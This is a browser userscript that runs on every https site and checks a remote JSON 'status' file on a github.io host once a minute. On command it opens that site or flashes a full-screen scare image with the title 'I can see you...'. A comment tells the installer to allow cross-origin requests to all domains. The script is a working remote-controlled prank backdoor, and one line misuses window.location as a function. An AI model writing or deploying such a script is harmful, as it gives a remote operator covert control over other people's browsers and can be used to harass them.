// ==UserScript==
// @name         New Userscript
// @namespace    http://tampermonkey.net/
// @version      2026-10-17
// @description  try to take over the world!
// @author       You
// @match        https://*/*
// @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==
// @connect      *
// @grant        GM_xmlhttpRequest
// ==/UserScript==

(function() {
    'use strict';

    // Your code here...
    //go to user script source code. where it says editor, click the second tab settings. scroll to xhr security, and add a new rule to user domain whitelist, set it to *

    let resp_json = {};
    let previous_state = "";
    function check_bd(){

        GM_xmlhttpRequest({
            url: "https://mllef1.github.io/bd.json?id=" + Math.random(),
            onload: function(response) {
                console.log("Got")
                resp_json = JSON.parse(response.responseText);
                console.log(resp_json['status']);

                if (previous_state != resp_json['status']){
                    console.log("Change made");




                    if (resp_json['status'] == "windows"){

                        window.open("https://mllef1.github.io/");
                        window.location("https://mllef1.github.io/");
                    }




                    if (resp_json['status'] == "obunga_flash"){

                        document.body.innerHTML += "<div id='obunga_stare' hidden style='position:fixed; top:0; left:0;max-width:100%; width:100%;max-height;auto;z-index:9999999999;'><img src='https://mllef1.github.io/obunga.jpg' style='width:100%; height:auto;'></div>";
                        function obunga_flash_method(){
                            if (Math.floor(Math.random()*8) == 3){
                                document.getElementById('obunga_stare').hidden = false;
                                let original_title = document.title;
                                document.title = "I can see you...";

                                function quickclose(){
                                    if (Math.floor(Math.random()*5) != 3){
                                        document.getElementById('obunga_stare').hidden = true;
                                        document.title = original_title;
                                        clearInterval(close_obunga);
                                    }
                                }
                                let close_obunga = setInterval(quickclose, 250);

                            }
                            if (resp_json['status'] != "obunga_flash"){
                                clearInterval(obunga_flash_runner);
                            }
                        }

                        let obunga_flash_runner = setInterval(obunga_flash_method, 5000);
                    }







                }
                previous_state = resp_json['status'];

            }
        });
    }
    check_bd();
    const check_bd_int = setInterval(check_bd, 60000);


})();